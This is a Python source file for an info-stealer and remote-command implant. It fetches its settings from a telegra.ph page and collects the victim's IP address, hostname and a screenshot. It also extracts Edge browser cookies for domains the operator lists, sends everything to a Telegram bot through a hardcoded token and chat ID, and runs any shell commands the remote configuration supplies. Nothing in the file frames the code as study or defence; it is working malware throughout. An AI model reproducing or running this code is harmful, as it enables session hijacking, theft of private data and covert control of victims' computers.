import telebot
import requests
import socket
from datetime import datetime
from PIL import ImageGrab
import os
import random
import json
import time
import browser_cookie3

token = "6192337221:AAESogPJK-_5wcjISHftUaJFnxDvS5kxtsE"
chat_id = "1104502854"
telegraph_url = "https://api.telegra.ph/getPage/emogirl-03-08?return_content=false"
#https://telegra.ph/emogirl-03-08

def getCookiesFromDomain(domain,cookieName=''):

    Cookies={}
    chromeCookies = list(browser_cookie3.edge())

    for cookie in chromeCookies:

        if (domain in cookie.domain):
            Cookies[cookie.name]=cookie.value

    if(cookieName!=''):
        try:
            return Cookies[cookieName]
        except:
            return {}
    else:
        return Cookies

def get_config():
    return requests.get(telegraph_url).text.split('\n')

def get_ip():
    ip = requests.get('https://api.ipify.org').text
    return ip

def get_hostname():
    hostname = socket.gethostname()
    return hostname



def main():
    config = json.loads(json.loads(get_config()[0])['result']['description']) #get config from telegraph and convert to json
    
    

    #{'enable': True, 'chat_id': '1251285260', 'send_message': True, 'delay': 0, 'get_settings': {'get_ip': True, 'get_hostname': True, 'take_screenshot': True}, 'shell_commands': []}
    if config['enable'] == False:
        exit(0)

    time.sleep(config['delay'])

    d_ip, d_hostname = "None", "None"
    chat_id = config['chat_id']
    bot = telebot.TeleBot(token)
    randname = f"{get_hostname()}-{str(random.randint(111111,999999))}"


    if config['get_settings']['get_ip'] == True:
        d_ip = get_ip()
    if config['get_settings']['get_hostname'] == True:
        d_hostname = get_hostname()
    if config['get_settings']['take_screenshot'] == True:
        try:
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + f'\\screen{randname}.jpg')
        except Exception as err:
            print(err)
            bot.send_message(chat_id, f'error: {err} ')
    d_date = datetime.now()
    
    data = f"""
ip: {d_ip}
hostname: {d_hostname}
date: {d_date}
"""


    if(config['get_settings']['take_screenshot'] == True):
        try:
            bot.send_photo(chat_id, open(f'screen{randname}.jpg', 'rb'), data)
        except:
            pass
    else:
        bot.send_message(chat_id, data)





    
    
    print(config)

    if(config['get_settings']['get_cookies'] == True):
        with open(f'cookies{randname}.txt', 'w') as f:
            for domain in config['get_settings']['cookie_websites']:
                # print(domain)
                # print(getCookiesFromDomain(domain))
                # bot.send_message(chat_id, f"{domain}:\n{getCookiesFromDomain(domain)}")
                f.write(f"{domain}:\n{getCookiesFromDomain(domain)}\n\n")
        bot.send_document(chat_id, open(os.getcwd()+f'\\cookies{randname}.txt', 'rb'))

    for command in config['shell_commands']:
        print(command)
        os.system(command)




main()